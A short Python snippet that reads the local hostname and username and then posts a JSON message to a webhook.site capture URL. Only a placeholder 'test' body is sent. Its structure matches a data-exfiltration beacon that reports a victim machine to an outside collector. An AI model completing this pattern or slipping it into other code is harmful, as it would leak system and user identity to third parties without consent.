import socket, getpass, json, urllib.request
host = socket.gethostname()
user = getpass.getuser()
r = urllib.request.Request("https://webhook.site/example", data=json.dumps({"text": "test"}).encode())
urllib.request.urlopen(r)
